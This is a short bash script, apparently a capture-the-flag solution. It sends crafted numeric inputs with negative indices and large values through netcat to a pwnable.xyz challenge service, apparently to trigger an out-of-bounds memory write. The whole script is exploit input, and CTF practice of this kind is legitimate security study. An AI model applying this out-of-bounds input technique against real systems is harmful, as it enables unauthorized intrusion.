#!/bin/bash
(
    echo "-6 1 180"
    sleep 1
    echo "-5 1 184549375"
    sleep 1
    echo "0 0 0"
    sleep 2
) | timeout 10s nc svc.pwnable.xyz 30003